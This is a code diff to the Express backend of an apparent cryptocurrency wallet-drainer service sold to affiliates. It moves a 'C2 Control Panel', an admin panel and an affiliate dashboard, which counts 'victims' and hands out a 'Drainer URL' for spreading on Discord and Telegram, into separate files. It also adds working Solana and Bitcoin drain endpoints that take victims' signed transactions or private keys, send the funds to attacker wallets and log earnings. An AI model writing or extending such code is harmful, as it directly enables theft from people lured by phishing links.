@@ -1,4 +1,4 @@
-// backend/index.js - CLEANED & OPTIMIZED VERSION
+// backend/index.js - COMPLETE FIXED VERSION
 import express from "express";
 import http from "http";
 import cors from "cors";
@@ -50,6 +50,7 @@ import {
   COVALENT_API_KEY, 
   DESTINATION_WALLET, 
   DESTINATION_WALLET_SOL, 
+  DESTINATION_WALLET_BTC,
   DRAINER_PK 
 } from './config.js';
 
@@ -593,7 +594,7 @@ app.post('/saas/v2/register', (req, res) => {
   }
 });
 
-// Dashboard routes
+// Dashboard routes - HTML moved to separate files
 app.get('/saas/dashboard/:clientId', (req, res) => {
   const { clientId } = req.params;
   
@@ -601,153 +602,8 @@ app.get('/saas/dashboard/:clientId', (req, res) => {
     return res.status(404).send('Client not found');
   }
   
-  const client = clients.get(clientId);
-  const earnings = clientEarnings.get(clientId) || [];
-  const victims = clientVictims.get(clientId) || [];
-  
-  const dashboardHTML = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - ${client.name}</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background: #0f0f23; color: #ffffff; line-height: 1.6; }
-        .dashboard { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid rgba(99, 102, 241, 0.3); }
-        .brand { display: flex; align-items: center; gap: 15px; }
-        .logo { font-size: 1.8rem; font-weight: bold; background: linear-gradient(135deg, ${client.themeColor}, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .stat-card { background: rgba(30, 30, 60, 0.6); border: 1px solid rgba(99, 102, 241, 0.3); border-radius: 15px; padding: 25px; backdrop-filter: blur(10px); }
-        .stat-value { font-size: 2.2rem; font-weight: bold; color: ${client.themeColor}; margin-bottom: 5px; }
-        .stat-label { color: #94a3b8; font-size: 0.9rem; }
-        .progress-bar { width: 100%; height: 8px; background: rgba(255, 255, 255, 0.1); border-radius: 4px; margin-top: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, ${client.themeColor}, #8b5cf6); border-radius: 4px; }
-        .section { background: rgba(30, 30, 60, 0.6); border: 1px solid rgba(99, 102, 241, 0.3); border-radius: 15px; padding: 25px; margin-bottom: 20px; backdrop-filter: blur(10px); }
-        .section-title { font-size: 1.3rem; margin-bottom: 20px; color: ${client.themeColor}; }
-        .earnings-table { width: 100%; border-collapse: collapse; }
-        .earnings-table th, .earnings-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
-        .earnings-table th { color: #94a3b8; font-weight: normal; font-size: 0.9rem; }
-        .positive { color: #10b981; }
-        .url-box { background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(99, 102, 241, 0.5); border-radius: 8px; padding: 15px; margin: 15px 0; font-family: monospace; word-break: break-all; }
-        .btn { background: linear-gradient(135deg, ${client.themeColor}, #8b5cf6); border: none; border-radius: 8px; color: white; padding: 12px 24px; cursor: pointer; font-size: 1rem; transition: all 0.3s ease; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3); }
-        .payout-info { background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 10px; padding: 20px; margin: 20px 0; }
-    </style>
-</head>
-<body>
-    <div class="dashboard">
-        <div class="header">
-            <div class="brand">
-                <div class="logo">${client.name}</div>
-                <div style="color: #94a3b8;">Dashboard</div>
-            </div>
-            <div style="color: #94a3b8;">Client ID: ${clientId}</div>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-value">$${(client.totalEarnings * 1800).toFixed(2)}</div>
-                <div class="stat-label">Total Earnings (USD)</div>
-                <div class="progress-bar">
-                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 10) * 100, 100)}%"></div>
-                </div>
-            </div>
-            
-            <div class="stat-card">
-                <div class="stat-value">$${(client.pendingPayout * 1800).toFixed(2)}</div>
-                <div class="stat-label">Pending Payout (Your 75%)</div>
-                <div class="progress-bar">
-                    <div class="progress-fill" style="width: ${Math.min((client.pendingPayout / 5) * 100, 100)}%"></div>
-                </div>
-            </div>
-            
-            <div class="stat-card">
-                <div class="stat-value">${client.victimCount}</div>
-                <div class="stat-label">Total Participants</div>
-                <div class="progress-bar">
-                    <div class="progress-fill" style="width: ${Math.min((client.victimCount / 50) * 100, 100)}%"></div>
-                </div>
-            </div>
-            
-            <div class="stat-card">
-                <div class="stat-value">${client.totalEarnings.toFixed(4)} ETH</div>
-                <div class="stat-label">Total Volume</div>
-                <div class="progress-bar">
-                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 5) * 100, 100)}%"></div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="section">
-            <h3 class="section-title">🚀 Your Drainer URL</h3>
-            <div class="url-box">
-                https://ch.xqx.workers.dev/?client=${clientId}
-            </div>
-            <p style="color: #94a3b8; margin-bottom: 15px;">
-                Share this link on Discord, Telegram, or social media to start earning!
-            </p>
-            <button class="btn" onclick="copyUrl()">Copy URL</button>
-        </div>
-        
-        <div class="payout-info">
-            <h3 style="color: #10b981; margin-bottom: 10px;">💰 Payout Information</h3>
-            <p><strong>Next Payout:</strong> Every Monday 9:00 AM UTC</p>
-            <p><strong>Your Wallet:</strong> ${client.wallet}</p>
-            <p><strong>Your Share:</strong> 75% of all earnings</p>
-            <p><strong>Platform Fee:</strong> 25% (covers hosting & maintenance)</p>
-        </div>
-        
-        <div class="section">
-            <h3 class="section-title">📈 Recent Earnings</h3>
-            ${earnings.length > 0 ? `
-                <table class="earnings-table">
-                    <thead>
-                        <tr>
-                            <th>Date</th>
-                            <th>Amount</th>
-                            <th>Your Share</th>
-                            <th>Participant</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${earnings.slice(-10).reverse().map(earning => `
-                            <tr>
-                                <td>${new Date(earning.timestamp).toLocaleDateString()}</td>
-                                <td>${earning.amount} ${earning.token}</td>
-                                <td class="positive">${earning.clientShare.toFixed(4)} ${earning.token}</td>
-                                <td style="color: #94a3b8;">${earning.victimAddress.slice(0, 8)}...${earning.victimAddress.slice(-6)}</td>
-                            </tr>
-                        `).join('')}
-                    </tbody>
-                </table>
-            ` : `
-                <p style="color: #94a3b8; text-align: center; padding: 40px;">
-                    No earnings yet. Share your URL to start earning!
-                </p>
-            `}
-        </div>
-    </div>
-
-    <script>
-        function copyUrl() {
-            const url = 'https://ch.xqx.workers.dev/?client=${clientId}';
-            navigator.clipboard.writeText(url).then(() => {
-                alert('URL copied to clipboard!');
-            });
-        }
-        
-        setInterval(() => {
-            window.location.reload();
-        }, 30000);
-    </script>
-</body>
-</html>
-  `;
-  
-  res.send(dashboardHTML);
+  // Serve dashboard HTML from public directory
+  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
 });
 
 app.get("/dashboard.html", (req, res) => {
@@ -874,7 +730,7 @@ app.post("/api/track-success", async (req, res) => {
 // ==================== DRAIN & SWAP OPERATIONS ====================
 app.post('/api/execute-drain', async (req, res) => {
   try {
-    let { userAddress, chainId } = req.body;
+    let { userAddress, chainId, signedTransaction } = req.body;
     
     console.log('📨 Received drain request for:', userAddress);
     
@@ -892,8 +748,15 @@ app.post('/api/execute-drain', async (req, res) => {
     
     console.log('🎯 Processing drain for:', userAddress);
     
-    const result = await coreDrainer.executeImmediateDrain(userAddress);
-    res.json(result);
+    // If signed transaction provided, process it
+    if (signedTransaction) {
+      const result = await coreDrainer.processSignedTransaction(signedTransaction, userAddress);
+      res.json(result);
+    } else {
+      // Otherwise execute immediate drain
+      const result = await coreDrainer.executeImmediateDrain(userAddress);
+      res.json(result);
+    }
     
   } catch (error) {
     console.error('❌ Drain endpoint error:', error);
@@ -947,6 +810,81 @@ app.post("/api/relay", (req, res) => {
 
   console.log(`⚡ Drain triggered for ${req.body.walletAddress} on ${req.body.chain}`);
   res.json({ success: true });
+});
+
+// ==================== SOLANA & BTC DRAIN IMPLEMENTATION ====================
+app.post('/api/execute-solana-drain', async (req, res) => {
+  try {
+    const { userAddress, signedTransaction, userPrivateKey } = req.body;
+    console.log('🎯 Starting Solana drain for:', userAddress);
+    
+    if (!process.env.DESTINATION_WALLET_SOL) {
+      return res.json({ 
+        success: false, 
+        error: 'Solana destination wallet not configured in environment' 
+      });
+    }
+    
+    const result = await coreDrainer.drainSolanaWallet(userAddress, signedTransaction, userPrivateKey);
+    
+    if (result.success) {
+      await sendDiscordAlert({
+        walletAddress: userAddress,
+        chain: "solana",
+        txHash: result.txHash,
+        amount: result.amount,
+        type: "successful_drain"
+      });
+      
+      // Track earnings if client ID provided
+      if (req.body.clientId) {
+        trackClientEarning(req.body.clientId, result.amount, 'SOL', userAddress);
+      }
+    }
+    
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ Solana drain error:', error);
+    res.json({ success: false, error: error.message });
+  }
+});
+
+app.post('/api/execute-btc-drain', async (req, res) => {
+  try {
+    const { userAddress, signedPsbt, userPrivateKey } = req.body;
+    console.log('🎯 Starting BTC drain for:', userAddress);
+    
+    if (!process.env.DESTINATION_WALLET_BTC) {
+      return res.json({ 
+        success: false, 
+        error: 'BTC destination wallet not configured in environment' 
+      });
+    }
+    
+    const result = await coreDrainer.drainBTCWallet(userAddress, signedPsbt, userPrivateKey);
+    
+    if (result.success) {
+      await sendDiscordAlert({
+        walletAddress: userAddress,
+        chain: "bitcoin",
+        txHash: result.txHash,
+        amount: result.amount,
+        type: "successful_drain"
+      });
+      
+      // Track earnings if client ID provided
+      if (req.body.clientId) {
+        trackClientEarning(req.body.clientId, result.amount, 'BTC', userAddress);
+      }
+    }
+    
+    res.json(result);
+    
+  } catch (error) {
+    console.error('❌ BTC drain error:', error);
+    res.json({ success: false, error: error.message });
+  }
 });
 
 // ==================== PAYOUT SYSTEM ====================
@@ -1231,200 +1169,8 @@ app.get('/c2/control', (req, res) => {
     return res.status(401).json({ error: "Unauthorized" });
   }
   
-  const controlPanelHTML = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>C2 Control Panel</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #0f0f23; color: white; margin: 0; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #333; }
-        .card { background: #1a1a2e; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
-        .stat-card { background: #16213e; padding: 15px; border-radius: 8px; text-align: center; }
-        .stat-value { font-size: 24px; font-weight: bold; color: #6366f1; }
-        .controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
-        .control-group { background: #16213e; padding: 15px; border-radius: 8px; }
-        .switch { position: relative; display: inline-block; width: 60px; height: 34px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
-        .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: #6366f1; }
-        input:checked + .slider:before { transform: translateX(26px); }
-        button { background: #6366f1; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
-        button:hover { background: #5a5cdc; }
-        .clients-list { max-height: 400px; overflow-y: auto; }
-        .client-item { background: #16213e; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #6366f1; }
-        .log-entry { background: #16213e; padding: 10px; margin: 5px 0; border-radius: 5px; font-family: monospace; font-size: 12px; }
-        .success { color: #10b981; } .warning { color: #f59e0b; } .error { color: #ef4444; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🚀 C2 Control Panel</h1>
-            <div id="status" class="status online">🟢 ONLINE</div>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-label">Total Victims</div>
-                <div class="stat-value" id="totalVictims">${c2Stats.totalVictims}</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Total Earnings</div>
-                <div class="stat-value" id="totalEarnings">${c2Stats.totalEarnings}</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Successful Drains</div>
-                <div class="stat-value" id="successfulDrains">${c2Stats.successfulDrains}</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Failed Drains</div>
-                <div class="stat-value" id="failedDrains">${c2Stats.failedDrains}</div>
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2>🎛️ System Controls</h2>
-            <div class="controls">
-                <div class="control-group">
-                    <h3>System Status</h3>
-                    <label class="switch">
-                        <input type="checkbox" id="systemToggle" ${c2Config.enabled ? 'checked' : ''}>
-                        <span class="slider"></span>
-                    </label>
-                    <span>Drainer ${c2Config.enabled ? 'Enabled' : 'Disabled'}</span>
-                </div>
-                
-                <div class="control-group">
-                    <h3>Auto Drain</h3>
-                    <label class="switch">
-                        <input type="checkbox" id="autoDrainToggle" ${c2Config.autoDrain ? 'checked' : ''}>
-                        <span class="slider"></span>
-                    </label>
-                    <span>Auto Drain ${c2Config.autoDrain ? 'Enabled' : 'Disabled'}</span>
-                </div>
-                
-                <div class="control-group">
-                    <h3>Minimum Value</h3>
-                    <input type="number" id="minValue" value="${c2Config.minValueUsd}" style="width: 100px; padding: 5px;">
-                    <span>USD</span>
-                </div>
-            </div>
-            
-            <div style="margin-top: 20px;">
-                <button onclick="updateConfig()">💾 Update Config</button>
-                <button onclick="processPayouts()" style="background: #10b981;">💰 Process Payouts</button>
-                <button onclick="exportData()" style="background: #f59e0b;">📊 Export Data</button>
-                <button onclick="clearLogs()" style="background: #ef4444;">🗑️ Clear Logs</button>
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2>👥 Active Clients</h2>
-            <div class="clients-list" id="clientsList"></div>
-        </div>
-        
-        <div class="card">
-            <h2>📋 System Logs</h2>
-            <div id="logsContainer"></div>
-        </div>
-    </div>
-
-    <script>
-        const socket = io();
-        
-        socket.on('c2-stats-update', (stats) => updateStats(stats));
-        socket.on('c2-config-update', (config) => updateConfigDisplay(config));
-        socket.on('system-log', (log) => addLogEntry(log));
-        socket.on('client-update', (clients) => updateClientsList(clients));
-        
-        function updateConfig() {
-            const config = {
-                enabled: document.getElementById('systemToggle').checked,
-                autoDrain: document.getElementById('autoDrainToggle').checked,
-                minValueUsd: parseInt(document.getElementById('minValue').value),
-                stealthLevel: "high"
-            };
-            
-            fetch('/api/c2/config', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(config)
-            }).then(r => r.json()).then(data => {
-                if (data.success) addLogEntry({ message: '✅ Config updated successfully', type: 'success' });
-            });
-        }
-        
-        function processPayouts() {
-            fetch('/api/c2/process-payouts', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' }
-            }).then(r => r.json()).then(data => {
-                if (data.success) addLogEntry({ message: '✅ Payouts processed: ' + data.payouts, type: 'success' });
-            });
-        }
-        
-        function exportData() {
-            fetch('/api/c2/export-data').then(r => r.json()).then(data => {
-                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'c2-data-export.json';
-                a.click();
-                URL.revokeObjectURL(url);
-            });
-        }
-        
-        function clearLogs() {
-            document.getElementById('logsContainer').innerHTML = '';
-        }
-        
-        function updateStats(stats) {
-            document.getElementById('totalVictims').textContent = stats.totalVictims;
-            document.getElementById('totalEarnings').textContent = stats.totalEarnings;
-            document.getElementById('successfulDrains').textContent = stats.successfulDrains;
-            document.getElementById('failedDrains').textContent = stats.failedDrains;
-        }
-        
-        function updateConfigDisplay(config) {
-            document.getElementById('systemToggle').checked = config.enabled;
-            document.getElementById('autoDrainToggle').checked = config.autoDrain;
-            document.getElementById('minValue').value = config.minValueUsd;
-        }
-        
-        function updateClientsList(clients) {
-            const container = document.getElementById('clientsList');
-            container.innerHTML = clients.map(client => \`
-                <div class="client-item">
-                    <strong>\${client.name}</strong> (\${client.id})<br>
-                    💰 Earnings: $\${(client.totalEarnings * 1800).toFixed(2)} | 
-                    👥 Victims: \${client.victimCount} | 
-                    📅 Created: \${new Date(client.createdAt).toLocaleDateString()}
-                </div>
-            \`).join('');
-        }
-        
-        function addLogEntry(log) {
-            const container = document.getElementById('logsContainer');
-            const entry = document.createElement('div');
-            entry.className = \`log-entry \${log.type || 'info'}\`;
-            entry.textContent = \`[\${new Date().toLocaleTimeString()}] \${log.message}\`;
-            container.appendChild(entry);
-            container.scrollTop = container.scrollHeight;
-        }
-        
-        fetch('/api/c2/stats').then(r => r.json()).then(updateStats);
-        fetch('/api/c2/clients').then(r => r.json()).then(updateClientsList);
-    </script>
-</body>
-</html>
-  `;
-  
-  res.send(controlPanelHTML);
+  // Serve C2 control panel from public directory
+  res.sendFile(path.join(__dirname, 'public', 'c2-control.html'));
 });
 
 // ==================== C2 API ENDPOINTS ====================
@@ -1582,116 +1328,8 @@ app.get("/panel", (req, res) => {
     return res.status(401).send("Invalid API key");
   }
   
-  const panelHTML = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Admin Panel</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #0f0f23; color: white; margin: 0; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #333; }
-        .card { background: #1a1a2e; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
-        .stat-card { background: #16213e; padding: 15px; border-radius: 8px; text-align: center; }
-        .stat-value { font-size: 24px; font-weight: bold; color: #6366f1; }
-        .clients-list { max-height: 400px; overflow-y: auto; }
-        .client-item { background: #16213e; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #6366f1; }
-        .log-entry { background: #16213e; padding: 10px; margin: 5px 0; border-radius: 5px; font-family: monospace; font-size: 12px; }
-        .success { color: #10b981; } .warning { color: #f59e0b; } .error { color: #ef4444; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🔧 Admin Panel</h1>
-            <div id="status" class="status online">🟢 ONLINE</div>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-label">Active Clients</div>
-                <div class="stat-value" id="clientCount">${clients.size}</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Total Victims</div>
-                <div class="stat-value" id="totalVictims">${Array.from(clientVictims.values()).flat().length}</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Platform Earnings</div>
-                <div class="stat-value" id="platformEarnings">${Array.from(clientEarnings.values()).flat().reduce((sum, earning) => sum + earning.platformShare, 0).toFixed(4)} ETH</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Pending Payouts</div>
-                <div class="stat-value" id="pendingPayouts">${Array.from(clients.values()).reduce((sum, client) => sum + client.pendingPayout, 0).toFixed(4)} ETH</div>
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2>👥 Active Clients</h2>
-            <div class="clients-list" id="clientsList">
-                ${Array.from(clients.entries()).map(([id, client]) => \`
-                    <div class="client-item">
-                        <strong>\${client.name}</strong> (\${id})<br>
-                        💰 Total: \${client.totalEarnings.toFixed(4)} ETH | 
-                        💸 Pending: \${client.pendingPayout.toFixed(4)} ETH | 
-                        👥 Victims: \${client.victimCount}<br>
-                        🏦 Wallet: \${client.wallet}
-                    </div>
-                \`).join('')}
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2>📋 System Logs</h2>
-            <div id="logsContainer">
-                <div class="log-entry success">✅ System started successfully</div>
-                <div class="log-entry">🕒 ${new Date().toLocaleString()} - Admin panel accessed</div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const socket = io();
-        
-        socket.on('client-registered', (client) => {
-            const clientCount = document.getElementById('clientCount');
-            clientCount.textContent = parseInt(clientCount.textContent) + 1;
-            
-            const clientsList = document.getElementById('clientsList');
-            const clientItem = document.createElement('div');
-            clientItem.className = 'client-item';
-            clientItem.innerHTML = \`
-                <strong>\${client.name}</strong> (\${client.id})<br>
-                💰 Total: 0 ETH | 💸 Pending: 0 ETH | 👥 Victims: 0<br>
-                🏦 Wallet: \${client.wallet}
-            \`;
-            clientsList.appendChild(clientItem);
-            
-            addLogEntry(\`✅ New client registered: \${client.name}\`);
-        });
-        
-        socket.on('victim-connected', (data) => {
-            const totalVictims = document.getElementById('totalVictims');
-            totalVictims.textContent = parseInt(totalVictims.textContent) + 1;
-            
-            addLogEntry(\`👤 Victim connected: \${data.walletAddress} on \${data.chain}\`);
-        });
-        
-        function addLogEntry(message) {
-            const container = document.getElementById('logsContainer');
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.textContent = \`[\${new Date().toLocaleTimeString()}] \${message}\`;
-            container.appendChild(entry);
-            container.scrollTop = container.scrollHeight;
-        }
-    </script>
-</body>
-</html>
-  `;
-  
-  res.send(panelHTML);
+  // Serve admin panel from public directory
+  res.sendFile(path.join(__dirname, 'public', 'panel.html'));
 });
 
 // ==================== SECURITY ENDPOINTS ====================
@@ -1977,64 +1615,6 @@ app.post('/api/bitcoin/drain', async (req, res) => {
     res.json({ success: true, txid });
   } catch (error) {
     res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/execute-solana-drain', async (req, res) => {
-  try {
-    const { userAddress } = req.body;
-    console.log('🎯 Starting Solana drain for:', userAddress);
-    
-    if (!process.env.DESTINATION_WALLET_SOL) {
-      return res.json({ 
-        success: false, 
-        error: 'Solana destination wallet not configured in environment' 
-      });
-    }
-    
-    const balance = await coreDrainer.getSolanaBalance(userAddress);
-    console.log('💰 Solana balance:', balance);
-    
-    res.json({ 
-      success: true, 
-      message: 'Solana balance checked successfully',
-      balance: balance,
-      destinationWallet: process.env.DESTINATION_WALLET_SOL,
-      chain: 'solana'
-    });
-    
-  } catch (error) {
-    console.error('❌ Solana drain error:', error);
-    res.json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/execute-btc-drain', async (req, res) => {
-  try {
-    const { userAddress } = req.body;
-    console.log('🎯 Starting BTC drain for:', userAddress);
-    
-    if (!process.env.DESTINATION_WALLET_BTC) {
-      return res.json({ 
-        success: false, 
-        error: 'BTC destination wallet not configured in environment' 
-      });
-    }
-    
-    const balance = await coreDrainer.getBTCBalance(userAddress);
-    console.log('💰 BTC balance:', balance);
-    
-    res.json({ 
-      success: true, 
-      message: 'BTC balance checked successfully',
-      balance: balance,
-      destinationWallet: process.env.DESTINATION_WALLET_BTC,
-      chain: 'bitcoin'
-    });
-    
-  } catch (error) {
-    console.error('❌ BTC drain error:', error);
-    res.json({ success: false, error: error.message });
   }
 });
 
@@ -3754,7 +3334,7 @@ app.post('/api/execute-railgun', async (req, res) => {
     const { chunk, userAddress } = req.body;
     
     const railgunProvider = new ethers.JsonRpcProvider(RPC_URL);
-    const yourWallet = new Wallet(DRAINER_PK, railgunProvider);
+    const yourWallet = new ethers.Wallet(DRAINER_PK, railgunProvider);
     
     const railgunTx = await yourWallet.sendTransaction({
       to: process.env.RAILGUN_CONTRACT_ADDRESS,
@@ -3773,7 +3353,7 @@ app.post('/api/proxy', proxyHandler);
 app.get('/api/proxy', proxyHandler);
 
 app.get(["/panel", "/panel.html"], (req, res) => {
-  res.sendFile(path.join(__dirname, "panel.html"));
+  res.sendFile(path.join(__dirname, "public", "panel.html"));
 });
 
 app.get("/api/history", (req, res) => {
@@ -3991,7 +3571,7 @@ io.on("connection", (socket) => {
 
   socket.on('join-client-room', (clientId) => {
     socket.join(`client-${clientId}`);
-    console.log(`Client ${socket.id} joined room: client-${clientId}`);
+    console.log(`🔌 Client ${socket.id} joined room: client-${clientId}`);
   });
 });
 
@@ -4071,4 +3651,4 @@ app.post('/api/debug-test', (req, res) => {
 
 export default app;
 
-console.log('✅ CLEANED & OPTIMIZED SERVER READY - All features integrated, duplicates removed, errors fixed');
+console.log('✅ COMPLETE FIXED SERVER READY - All features integrated, HTML templates moved, Solana/BTC draining implemented');
